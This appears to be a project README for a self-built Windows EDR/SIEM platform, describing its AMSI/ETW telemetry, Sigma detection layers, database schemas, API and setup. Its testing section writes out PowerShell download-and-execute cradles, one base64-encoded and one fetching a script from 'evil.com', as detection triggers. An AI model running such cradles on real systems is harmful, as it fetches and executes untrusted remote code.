# 🛡️ ISHAX Enterprise EDR & SIEM Platform
> **Next-Generation Endpoint Detection and Response System with In-Memory AMSI Telemetry, Dual-Layer Detection, Multi-Tenant SaaS Architecture, and AI-Powered Incident Triage.**

---

[![Architecture](https://img.shields.io/badge/Architecture-Multi--Tenant%20SaaS-indigo.svg)](#-architecture--system-design)
[![Backend](https://img.shields.io/badge/Backend-FastAPI%20%7C%20Python%203.10+-107f8e.svg)](#-backend-rest-api)
[![Frontend](https://img.shields.io/badge/Frontend-React%2018%20%7C%20TypeScript%20%7C%20Vite-61dafb.svg)](#-frontend-soc-dashboard)
[![Detection](https://img.shields.io/badge/Detection-pySigma%20%7C%20ETW%20AMSI%20%7C%20Sysmon-ff4500.svg)](#-detection-engine--mitre-coverage)
[![Database](https://img.shields.io/badge/Database-SQLite%20WAL%20%7C%20Multi--DB-003b57.svg)](#-database-schema--data-dictionary)
[![Mitre](https://img.shields.io/badge/MITRE%20ATT%26CK-T1059%20%7C%20T1027%20%7C%20T1543-blue.svg)](#-mitre-attck-matrix)

---

## 📌 Executive Summary

**ISHAX EDR** is a full-stack, enterprise-grade Endpoint Detection and Response (EDR) and Security Information and Event Management (SIEM) platform designed to capture, correlate, and analyze endpoint behavior in real time. 

Built to combat modern fileless malware, obfuscated living-off-the-land binaries (LotL), and memory-only script execution, ISHAX pairs **Real-Time Event Tracing for Windows (ETW) AMSI In-Memory Telemetry** with **Sysmon Event Pipeline Analytics** powered by a dual-layer pySigma detection engine.

### 🌟 Why ISHAX EDR?

- **In-Memory AMSI ETW Interception**: Captures raw, un-obfuscated script payloads (PowerShell, VBScript, JScript, .NET assembly loads) directly before execution via a custom low-overhead native C#/C++ ETW watcher service (`amsi_watcher.exe`).
- **Dual-Layer Detection Engine**: Merges **Layer A** (AMSI memory payload regex pattern matching) and **Layer B** (pySigma YAML behavioral rules engine) across a 30-second correlation window to minimize false positives and derive high-confidence alerts.
- **Multi-Tenant SaaS Architecture**: Built-in tenant isolation supporting zero-trust tenant separation. Each organization gets an isolated SQLite database (`tenant_<uuid>.db`) managed by a central multi-tenant routing directory (`master.db`).
- **Automated Network Isolation (Kill Switch)**: One-click host network isolation via Windows Filtering Platform / `netsh advfirewall` rules that block all ingress/egress while maintaining C2 agent heartbeat.
- **Interactive Process Tree & Blast Radius**: Interactive visualization of process ancestry (Sysmon EID 1/5) with side-channel events (network connections, registry edits, file writes).
- **AI-Powered Incident Triage**: Built-in SOC assistant supporting LLM integration (OpenAI, Gemini, Ollama) for instant root-cause analysis, threat explanations, and remediation scripts.
- **Dynamic On-The-Fly Installer Compiler**: Dynamic backend API (`/download-installer`) that compiles customized NSIS single-executable Windows agent installers bundled with tenant registration keys on demand.

---

## 🏗️ Architecture & System Design

```text
               +-------------------------------------------------------------+
               |                  ENDPOINT AGENT STACK                       |
               |                                                             |
               |  +--------------------+  +-------------------------------+  |
               |  |  Sysmon 64-bit     |  | AMSI ETW Watcher Service      |  |
               |  |  Process, Net, Reg |  | (In-Memory Script Telemetry)  |  |
               |  +---------+----------+  +---------------+---------------+  |
               |            |                             |                  |
               |            +--------------+--------------+                  |
               |                           |                                 |
               |                           v                                 |
               |              +--------------------------+                   |
               |              | Wazuh Agent 4.8          |                   |
               |              | (Log Forwarder & AR)     |                   |
               |              +------------+-------------+                   |
               +---------------------------|---------------------------------+
                                           | Encrypted Telemetry (Port 1514)
                                           v
               +-------------------------------------------------------------+
               |                   ISHAX SERVER PIPELINE                     |
               |                                                             |
               |  +-------------------------------------------------------+  |
               |  | Wazuh Manager Container (Docker Compose)              |  |
               |  | Output: archives.json                                 |  |
               |  +------------------------+------------------------------+  |
               |                           |                                 |
               |                           v                                 |
               |  +-------------------------------------------------------+  |
               |  | Ingestor Engine (ingestor.py)                         |  |
               |  | Normalization, Process GUID resolution, AMSI decode   |  |
               |  +------------------------+------------------------------+  |
               |                           |                                 |
               |                           v                                 |
               |  +-------------------------------------------------------+  |
               |  | Detection Engine (detector.py)                        |  |
               |  |  - Layer A: AMSI Regex Match                          |  |
               |  |  - Layer B: pySigma Rules Engine                      |  |
               |  |  - Overlay: T1027 Obfuscation Entropy Math            |  |
               |  |  - 30s Window Correlation & Confidence Upgrade        |  |
               |  +------------------------+------------------------------+  |
               |                           |                                 |
               |         +-----------------+-----------------+               |
               |         |                                   |               |
               |         v                                   v               |
               |  +---------------+                 +-----------------+      |
               |  | Master DB     |                 | Per-Tenant DB   |      |
               |  | (master.db)   |                 | (tenant_xxx.db) |      |
               |  +---------------+                 +--------+--------+      |
               +---------------------------------------------|---------------+
                                                             |
                                                             v
               +-------------------------------------------------------------+
               |                   CONTROL & PRESENTATION LAYER              |
               |                                                             |
               |  +-------------------------------------------------------+  |
               |  | FastAPI Backend REST Server (backend/main.py)         |  |
               |  | Auth, Alerts API, Process Graph, AI Triage, Agent C2  |  |
               |  +------------------------+------------------------------+  |
               |                           | REST / WebSockets               |
               |                           v                                 |
               |  +-------------------------------------------------------+  |
               |  | React 18 + TypeScript SOC Dashboard (Vite Frontend)   |  |
               |  | Incident Queue, Process Tree, Firehose, Admin Suite   |  |
               |  +-------------------------------------------------------+  |
               +-------------------------------------------------------------+
```

---

## 🛠️ Technology Stack

| Layer | Technologies & Tools |
|---|---|
| **Endpoint Agent** | Windows ETW C#/Rust Watcher, Sysmon 64 (EID 1, 3, 5, 8, 10, 11, 12, 13, 14, 23), Wazuh Agent 4.8, NSIS Installer Framework, PowerShell Active Response |
| **Log Collector & Transport** | Wazuh Manager 4.8 Docker Container, OpenSSL, TCP/UDP 1514/1515 |
| **Pipeline & Processing** | Python 3.10+, pySigma Core & SQLite Backend, Regex Parsing Engines, UTF-16 LE Decoders |
| **Database Systems** | SQLite 3 (WAL Mode Concurrency, PRAGMA busy_timeout=5000), Custom Multi-Tenant Router |
| **Backend REST API** | FastAPI, Uvicorn, Pydantic v2, HTTPX, Python-Dotenv, Starlette Session Auth, BCrypt |
| **Frontend UI** | React 18, TypeScript, Vite, Tailwind CSS / Custom CSS Design Tokens, Lucide Icons, Gantt/Graph Components |
| **Threat Intelligence** | VirusTotal API Worker (`threat_intel_worker.py`), Async Queue System |
| **AI Integration** | OpenAI GPT-4 / Gemini / Ollama LLM integration for SOC Triage |

---

## ⚡ Key Feature Deep Dive

### 1. In-Memory AMSI ETW Interception Engine
Standard Antivirus and EDR products often fail to catch obfuscated scripts because malicious payloads are decoded directly in memory before invocation (e.g., Base64 `-EncodedCommand`, string concatenation, XOR, or environment variable substitution). 

ISHAX solves this via a background Windows system service (`ISHAXAmsiWatcher`) that hooks into the Event Tracing for Windows (ETW) provider `{2A576B87-09A7-520E-C21A-4942F0271D67}` (`Microsoft-Antimalware-Scan-Interface`). When PowerShell, VBScript, JScript, or C# assemblies run, AMSI passes the un-obfuscated script content to the ETW buffer. `amsi_watcher.exe` intercepts the payload, extracts the executing Process GUID, hex-encodes the buffer, and logs it to a custom Windows Event Log channel (`ISHAX-AMSI`), allowing the pipeline to analyze the actual code executed in memory.

### 2. Dual-Layer Correlation & 30-Second Merge Window
Detection in ISHAX is not a single static check; it uses a multi-layered correlation model:
- **Layer A (AMSI Content Analysis)**: Matches decrypted script payloads against known exploit patterns (e.g., Mimikatz `sekurlsa::logonpasswords`, Empire Stagers, Rubeus, BloodHound, Cobalt Strike beacons).
- **Layer B (Sigma Engine)**: Executes pySigma rules against normalized Sysmon/Windows Event attributes (`CommandLine`, `ParentImage`, `TargetObject`, `GrantedAccess`).
- **Obfuscation Score (T1027)**: Calculates Shannon Entropy and encoding marker density on incoming scripts.
- **Confidence Promotion**: If command-line rules fire alone, a `MEDIUM` confidence alert is issued. If AMSI content corroboration arrives for the same `(technique, process_guid, host)` within 30 seconds, the existing alert is **upgraded in real-time to `HIGH` confidence**.

### 3. Multi-Tenant SaaS Isolation
ISHAX was architected from day one as a multi-tenant Security Platform:
- **Central Master Router (`master.db`)**: Tracks registered tenant organization accounts, user access whitelists (`allowed_users`), agent-to-tenant ownership mapping, and network isolation flags.
- **Isolated Tenant Databases (`tenants/tenant_<uuid>.db`)**: Each tenant's telemetry, process trees, detections, and alerts live in a strictly separated SQLite database.
- **Admin Impersonation**: Enterprise administrators can inspect customer tenant dashboards in read-only impersonation mode directly from the Admin Panel.

### 4. Interactive Process Tree & Incident Chains
Clicking any alert in the React SOC Dashboard immediately constructs the complete execution tree:
- Visualizes root parent process (e.g., `explorer.exe` -> `cmd.exe` -> `powershell.exe` -> `whoami.exe`).
- Annotates every node with execution timestamps, process GUIDs, SHA256 hashes, parent-child links, and command lines.
- Overlays side-channel activity: network connections (Sysmon EID 3), file drops (EID 11), and registry persistence writes (EID 13).

### 5. Automated Host Isolation (Kill Switch)
When a critical threat is detected, SOC analysts can trigger **Network Isolation** from the dashboard. The backend signals the agent active-response subsystem, executing `isolate.ps1`. The script installs strict Windows Firewall rules that drop all incoming and outgoing IP traffic while explicitly keeping open TCP ports `1514`/`1515` (Wazuh C2) so the host remains manageable for remote remediation.

---

## 📂 Project Directory Structure

```text
fckedr/
├── START EDR.bat                 # One-click Windows launch script (starts full stack)
├── STOP EDR.bat                  # Clean shutdown script for all services
├── README.md                     # Enterprise documentation & project reference
│
├── endpoint/                     # Endpoint Agent Installer & Telemetry Collector
│   ├── amsi_sanity_check.ps1     # AMSI ETW channel verification utility
│   ├── amsi_watcher.exe          # Native Windows ETW AMSI Interceptor Service
│   ├── endpoint_setup.ps1        # Standalone PowerShell agent deployment script
│   ├── ISHAX_Setup.nsi           # NSIS Script for building silent single-exe agent installer
│   ├── isolate.ps1               # Network Isolation (Kill Switch) Active Response script
│   ├── ossec.conf                # Agent configuration & log channel subscriber template
│   ├── ossec_agent.conf          # Wazuh agent base config
│   ├── SETUP ENDPOINT.bat        # Interactive endpoint installation script
│   ├── sysmon_config.xml         # Custom Sysmon configuration file (EID 1-23)
│   ├── Sysmon64.exe              # Microsoft Sysmon 64-bit binary
│   ├── uninstall_endpoint.ps1    # Complete agent uninstaller script
│   ├── UNINSTALL ENDPOINT.bat    # Interactive agent uninstallation batch script
│   ├── unisolate.ps1             # Network Un-isolation Active Response script
│   └── wazuh-agent-4.8.0-1.msi   # Official Wazuh Agent MSI installer package
│
└── server/                       # Central Server Stack
    ├── start_local.ps1           # Master PowerShell orchestrator script (Status/Start/Stop)
    │
    ├── backend/                  # REST API Subsystem (FastAPI)
    │   ├── .env                  # Backend environment variables
    │   ├── .env.example          # Template environment configuration
    │   ├── main.py               # Main FastAPI server (2,400+ lines: Auth, Alerts, Graph, C2)
    │   └── requirements.txt      # Python dependencies for backend API
    │
    ├── frontend/                 # Security Operations Dashboard (React + TypeScript)
    │   ├── package.json          # Node.js dependencies & scripts
    │   ├── vite.config.ts        # Vite configuration & API proxy rules
    │   └── src/
    │       ├── App.tsx           # Main application routing & auth wrapper
    │       ├── index.css         # Enterprise dark design system tokens & styles
    │       ├── api/              # HTTP client API wrappers (`client.ts`)
    │       ├── components/       # UI Components:
    │       │   ├── AIPanel.tsx          # Floating AI SOC Triage Assistant
    │       │   ├── AlertQueue.tsx       # Filterable Alert Queue Table
    │       │   ├── BlastRadius.tsx      # Execution Blast Radius Visualizer
    │       │   ├── EvidenceDrawer.tsx   # Detailed Alert Evidence & Hex Viewer
    │       │   ├── ProcessTree.tsx      # Parent-Child Process Ancestry Tree
    │       │   ├── ThreatIntelModal.tsx # VirusTotal Threat Intel Inspection
    │       │   └── Topbar.tsx           # Global Navigation & SaaS Tenant Selector
    │       └── pages/            # Views:
    │           ├── Overview.tsx         # Executive Security Overview Dashboard
    │           ├── RulesEngine.tsx      # Sigma Rules Manager & YAML Editor
    │           ├── ThreatHunt.tsx       # Live Telemetry Threat Hunting Interface
    │           ├── Firehose.tsx         # Real-Time Event Stream Listener
    │           ├── AdminPanel.tsx       # SaaS Administration & Impersonation Panel
    │           └── Login.tsx            # Custom Authentication Page
    │
    ├── pipeline/                 # Ingestion & Detection Core Subsystem
    │   ├── amsi_patterns.json    # Layer A: In-Memory AMSI Malicious Script Patterns
    │   ├── DB_README.md          # Comprehensive Data Dictionary documentation
    │   ├── detector.py           # Layer A & B Detection Engine, Obfuscation & Merging
    │   ├── ingestor.py           # Wazuh archives.json Tailer & JSON Normalizer
    │   ├── master_schema.sql     # SQLite Schema for master directory (master.db)
    │   ├── migrate_db.py         # Automated database schema migration runner
    │   ├── migrate_rules.py      # Sigma YAML file importer into SQLite rules.db
    │   ├── multi_tenant_manager.py # SaaS Multi-Tenant Manager & Tenant Routing Engine
    │   ├── requirements.txt      # Pipeline Python dependencies (pySigma, etc.)
    │   ├── rules_db.py           # SQLite rules management & CRUD repository
    │   ├── schema.sql            # Core Telemetry & Alert SQLite Schema (edr.db)
    │   ├── sync_agents.py        # Wazuh Manager agent registry synchronizer
    │   ├── sync_agents_loop.py   # Continuous background polling loop for agent sync
    │   └── threat_intel_worker.py# Async VirusTotal Threat Intelligence Processor
    │
    └── wazuh/                    # Log Collection Container Stack
        └── docker-compose.yml    # Docker Compose definition for Wazuh Manager 4.8
```

---

## 🧹 Repository Storage & Clean Footprint

The repository maintains an ultra-clean footprint of **~13.38 MB** for fast cloning, git portability, and distribution. 

### ⚡ Runtime Auto-Generated Components
To keep the repository lightweight, heavy transient artifacts are auto-generated on startup and excluded from version control:

- **Per-Tenant Databases (`server/pipeline/tenants/tenant_*.db`)**: Auto-created on demand by the `multi_tenant_manager.py` router when endpoints or tenant users connect.
- **Log Archives (`server/wazuh/logs/archives/`)**: Wazuh raw event log streams (`archives.json` & `archives.log`) are generated dynamically during active telemetry collection.
- **Frontend Build & Modules (`server/frontend/node_modules/` & `dist/`)**: Dependencies install via `npm install` and production bundles compile on `npm run build`.
- **Dynamic Installer Output (`endpoint/Output/ISHAX_Setup.exe`)**: Compiled dynamically on the fly by the FastAPI `/download-installer` REST endpoint.

---

## 🗄️ Database Schema & Data Dictionary

ISHAX uses high-performance SQLite database engines running with Write-Ahead Logging (`PRAGMA journal_mode = WAL`) and optimized busy timeouts (`PRAGMA busy_timeout = 5000`).

### 1. Core Telemetry & Alert Schema (`schema.sql` -> Per-Tenant DB)

```sql
-- 1. Normalized Telemetry Events Table
CREATE TABLE events (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    wazuh_id        TEXT UNIQUE NOT NULL,      -- SHA256 deduplication key
    wazuh_ts        TEXT NOT NULL,             -- ISO timestamp
    wazuh_ts_epoch  INTEGER NOT NULL,          -- Unix epoch for range indexing
    agent_id        TEXT,                      -- Wazuh Agent ID
    agent_name      TEXT,                      -- Endpoint Hostname
    endpoint_id     TEXT,                      -- Tenant host identifier
    event_source    TEXT,                      -- High-level source label
    source_type     TEXT DEFAULT 'endpoint',   -- Log category
    channel         TEXT,                      -- Windows Channel (Sysmon, Security, ISHAX-AMSI)
    event_id        INTEGER,                   -- Windows Event ID (1, 3, 5, 11, 13, 4104)
    subject_user    TEXT,                      -- User execution context
    target_user     TEXT,                      -- Target account context
    image_path      TEXT,                      -- Executable binary path
    command_line    TEXT,                      -- Complete command-line arguments
    parent_image    TEXT,                      -- Parent process path
    process_guid    TEXT,                      -- Unique Process GUID
    parent_process_guid TEXT,                  -- Parent Process GUID
    destination_ip  TEXT,                      -- Remote network IP
    destination_port TEXT,                     -- Remote network port
    target_filename TEXT,                      -- File creation path
    hashes          TEXT,                      -- MD5/SHA256 file hashes
    target_object   TEXT,                      -- Registry path target
    amsi_scan_result INTEGER,                  -- AMSI Result (32768 = Detected)
    amsi_content_name TEXT,                    -- Script/Content identifier
    amsi_content_hex  TEXT,                    -- Hex-encoded UTF-16LE script buffer
    raw_json_original TEXT NOT NULL,           -- Pristine immutable raw JSON payload
    raw_json_normalized TEXT NOT NULL,         -- Pipeline normalized payload
    ingested_at     INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);

-- 2. Dual-Layer Staging Detections Table
CREATE TABLE raw_detections (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    process_guid    TEXT,                      -- Process GUID
    endpoint_id     TEXT,                      -- Host identity
    ts              INTEGER NOT NULL,          -- Detection timestamp epoch
    layer           TEXT NOT NULL,             -- amsi | cmdline | service | registry
    technique       TEXT NOT NULL,             -- MITRE Technique ID (e.g. T1059.001)
    matched_pattern TEXT,                      -- Rule title or regex pattern matched
    obfuscation_score REAL DEFAULT 0.0,        -- Obfuscation score [0.0 - 1.0]
    event_id_fk     INTEGER REFERENCES events(id) ON DELETE CASCADE,
    merged          INTEGER NOT NULL DEFAULT 0 -- Merge state flag
);

-- 3. Promoted User-Facing Alert Table
CREATE TABLE alerts (
    id                    INTEGER PRIMARY KEY AUTOINCREMENT,
    fired_at              INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    rule_id               TEXT NOT NULL,      -- Sigma Rule UUID or Technique ID
    rule_name             TEXT NOT NULL,      -- Rule Title
    mitre_technique       TEXT NOT NULL,      -- MITRE ATT&CK ID
    severity              TEXT NOT NULL CHECK(severity IN ('low','medium','high','critical')),
    event_id_fk           INTEGER REFERENCES events(id) ON DELETE CASCADE,
    source_process_guid   TEXT,               -- Executing Process GUID
    source_agent_name     TEXT,               -- Host Computer Name
    summary               TEXT NOT NULL,      -- Alert Summary text
    matched_json          TEXT,               -- Normalized event JSON
    confidence            TEXT DEFAULT 'HIGH' CHECK(confidence IN ('HIGH','MEDIUM','LOW')),
    amsi_matched_patterns TEXT,               -- Comma-separated AMSI regex matches
    no_amsi_corroboration INTEGER DEFAULT 0, -- 1 = Cmdline fired without AMSI proof
    obfuscation_score     REAL DEFAULT 0.0    -- T1027 Obfuscation rating
);

-- 4. Process Graph Ancestry Tables
CREATE TABLE process_nodes (
    process_guid        TEXT PRIMARY KEY,
    parent_process_guid TEXT,
    pid                 INTEGER,
    image               TEXT,
    command_line        TEXT,
    user_name           TEXT,
    host_id             TEXT,
    start_time          TEXT,
    end_time            TEXT
);

CREATE TABLE process_edges (
    process_guid    TEXT NOT NULL,
    host_id         TEXT,
    edge_type       TEXT NOT NULL,            -- network | file | registry
    target_label    TEXT NOT NULL,
    timestamp       TEXT NOT NULL
);
```

### 2. SaaS Directory Schema (`master_schema.sql` -> `master.db`)

```sql
CREATE TABLE tenants (
    id           TEXT PRIMARY KEY,             -- Organization UUID (tenant_8f3a2b)
    email        TEXT UNIQUE NOT NULL,         -- Account Administrator Email
    display_name TEXT,                         -- Organization Name
    db_filename  TEXT UNIQUE NOT NULL,         -- Per-tenant DB filename
    created_at   INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    is_active    INTEGER NOT NULL DEFAULT 1    -- Account status
);

CREATE TABLE agents (
    agent_id      TEXT PRIMARY KEY,            -- Wazuh Agent ID
    tenant_id     TEXT NOT NULL REFERENCES tenants(id) ON DELETE CASCADE,
    agent_name    TEXT,                        -- Hostname
    is_isolated   INTEGER NOT NULL DEFAULT 0   -- Network Isolation Flag
);

CREATE TABLE allowed_users (
    email         TEXT PRIMARY KEY,            -- Whitelisted User Email
    password_hash TEXT,                        -- BCrypt Password Hash
    added_by      TEXT NOT NULL DEFAULT 'admin'
);
```

---

## 🎯 MITRE ATT&CK Matrix Coverage

ISHAX provides out-of-the-box behavioral detection and in-memory hunting for key MITRE ATT&CK techniques:

| MITRE ID | Technique Name | Detection Layer | Triggering Mechanism / Telemetry |
|---|---|---|---|
| **T1059.001** | PowerShell Scripting | Layer A (AMSI) & Layer B (Sigma) | Memory Script Block Interception + `-EncodedCommand`, `Bypass`, Download Cradles |
| **T1059.005** | VBScript / VBA Execution | Layer A (AMSI) | In-Memory Macro execution via AMSI ETW Interception (`wscript.exe` / `cscript.exe`) |
| **T1059.007** | JavaScript / JScript | Layer A (AMSI) | Memory payload matching for obfuscated JS droppers (`mshta.exe` / `cscript.exe`) |
| **T1027** | Obfuscated Files / Information | Overlay | Mathematical Shannon Entropy + Base64 density evaluation on active scripts |
| **T1036** | Masquerading | Layer B (Sigma) | PE Metadata vs. Binary Path mismatch (e.g., `svchost.exe` running outside System32) |
| **T1219** | Remote Access Software Abuse | Layer B (Sigma) | Process & Network detection for unauthorized AnyDesk, TeamViewer, Ngrok, Atera |
| **T1543.003** | Windows Service Creation | Layer B (Sigma) | Sysmon EID 1 / System EID 7045 / Security EID 4697 Service Installation checks |
| **T1547.001** | Registry Run Keys / Startup | Layer B (Sigma) | Sysmon EID 13 (`TargetObject` matching `HKLM\...\Run` & `RunOnce`) |
| **T1055** | Process Injection | Sysmon EID 8 / 10 | Cross-process memory access & Remote Thread Creation (`CreateRemoteThread`) |
| **T1003** | OS Credential Dumping | Layer A & B | LSASS Memory Read attempts (`comsvcs.dll` Minidump, Mimikatz pattern matches) |

---

## 💻 REST API Reference

The backend FastAPI application exposes a rich REST API for the frontend and security integrations:

### Authentication & Tenant Management
- `POST /auth/login`: Authenticate with email/password session cookie.
- `POST /auth/logout`: Terminate active user session.
- `GET /auth/me`: Fetch current user identity, role (`admin` or `user`), and assigned tenant details.

### Incident Management & Telemetry
- `GET /alerts`: Retrieve paginated alerts with filters (`severity`, `technique`, `host`, `confidence`, `limit`, `offset`).
- `GET /alerts/{id}`: Detailed alert inspection with joined evidence events and AMSI matched patterns.
- `GET /stats`: Retrieve SOC metrics (Total Alerts, High Severity Count, Active Agents, MTTR, Top Techniques).
- `GET /timeline`: Retrieve alert frequency aggregated over time for trend plotting.
- `GET /firehose`: Real-time normalized telemetry event stream.

### Process Ancestry & Forensic Graphing
- `GET /process-tree/{guid}`: Constructs the full hierarchical parent-child process tree for a given Process GUID.
- `GET /process-graph/{guid}`: Retrieves execution blast radius including network connections, file operations, and registry edits.

### Endpoint Control & Installer C2
- `GET /agents`: List registered endpoint agents, status, and isolation states.
- `POST /agents/{id}/isolate`: Trigger automated host network isolation (Kill Switch).
- `POST /agents/{id}/unisolate`: Restore host network connectivity.
- `GET /download-installer`: Dynamically compile customized NSIS installer `.exe` with embedded tenant configuration.

### Rules Engine & AI SOC Triage
- `GET /rules`: List all loaded Sigma detection rules.
- `POST /rules`: Create or update custom Sigma rules.
- `POST /rules/{id}/toggle`: Enable or disable a detection rule in real time.
- `POST /ai/triage`: Send alert context to LLM AI SOC Assistant for instant triage and remediation recommendations.

---

## 🚀 Quick Start Guide

### Prerequisites
Before launching ISHAX EDR, ensure your system has the following installed:
1. **Windows 10 / 11 or Windows Server 2019+**
2. **Python 3.10+** (added to PATH)
3. **Node.js LTS (v18+) & npm** (added to PATH)
4. **Docker Desktop** (running with Linux containers enabled)
5. **PowerShell 5.1+**

### 1. Initial Setup (First Time / Fresh Clone)

If you just cloned the repository, install the frontend dependencies:
```powershell
cd server/frontend
npm install
cd ../..
```

### 2. Launching the Full Stack (Automated)

The entire platform (Wazuh Container, Ingestor Engine, Agent Sync Loop, Threat Intel Worker, FastAPI Backend, and React Dashboard) can be launched with a single script:

1. Right-click `START EDR.bat` and select **Run as Administrator** (or execute from an elevated Command Prompt):
   ```cmd
   START EDR.bat
   ```
2. The script will perform preflight dependency checks, start Docker services, spawn hidden background worker processes, and automatically launch your browser to:
   - **SOC Dashboard**: `http://localhost:5174` (or `http://localhost:5173`)
   - **Backend API Health**: `http://localhost:8001/health`

### 3. Manual Command Line Launch

If you prefer to start components manually for development:

```powershell
# 1. Start backend services via PowerShell script
powershell.exe -ExecutionPolicy Bypass -File .\server\start_local.ps1 -BackendPort 8001 -FrontendPort 5174

# 2. Check current system status
powershell.exe -ExecutionPolicy Bypass -File .\server\start_local.ps1 -Status

# 3. Stop all running EDR services cleanly
STOP EDR.bat
```

---

## 💻 Endpoint Agent Deployment

To deploy the ISHAX EDR Agent to a target Windows machine:

### Option A: Dynamic Web Installer (Recommended)
1. Log into the ISHAX SOC Dashboard as an Administrator.
2. Navigate to **Agent Management** and click **Download Agent Installer**.
3. Run the compiled `ISHAX_Setup.exe` on the target machine as **Administrator**.
4. The installer silently installs Sysmon, registers `ISHAXAmsiWatcher`, configures audit policies, provisions the Wazuh Agent, and connects to the server C2.

### Option B: Command Line Setup
On the target endpoint machine, open PowerShell as Administrator and run:
```powershell
cd endpoint
.\SETUP ENDPOINT.bat
```

To test AMSI Interception on the endpoint:
```powershell
# Run the AMSI verification script
.\amsi_sanity_check.ps1
```

---

## 🧪 Testing & Verification

To verify that the detection pipeline is operational:

1. **Test Command-Line Rule (Layer B)**:
   Open PowerShell on an endpoint with the agent installed and execute an encoded command string:
   ```powershell
   powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQ==
   ```
2. **Test AMSI In-Memory Interception (Layer A)**:
   In the same PowerShell session, paste a known test string or obfuscated memory pattern:
   ```powershell
   "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
   ```
3. **Verify Alert Promotion**:
   Refresh the **ISHAX SOC Dashboard**. You will observe a `HIGH` confidence alert generated with both **Layer A (AMSI Content)** and **Layer B (Sigma Rule)** evidence attached, accompanied by an obfuscation rating.

---

## 👨‍💻 Developer & Portfolio Context

This project was engineered to demonstrate production-ready expertise in **Cybersecurity Engineering, Threat Detection, Systems Architecture, and Full-Stack Development**.

**Key Technical Competencies Demonstrated**:
- Real-Time Windows Internals & Event Tracing (ETW, AMSI, Sysmon).
- High-Throughput Asynchronous Log Pipelines & Detection Engines (pySigma).
- Multi-Tenant Database Architecture & Concurrent WAL-Mode SQLite Tuning.
- Modern Reactive Web Interfaces with Graph & Tree Visualizations (React 18, TypeScript).
- Automated Infrastructure Orchestration (NSIS Dynamic Compilation, Windows Active Response Firewalling).

---

## 📄 License & Terms

Developed as an Enterprise EDR & SIEM Research Platform. Confidential / Open for Security Engineering & Portfolio Demonstration.
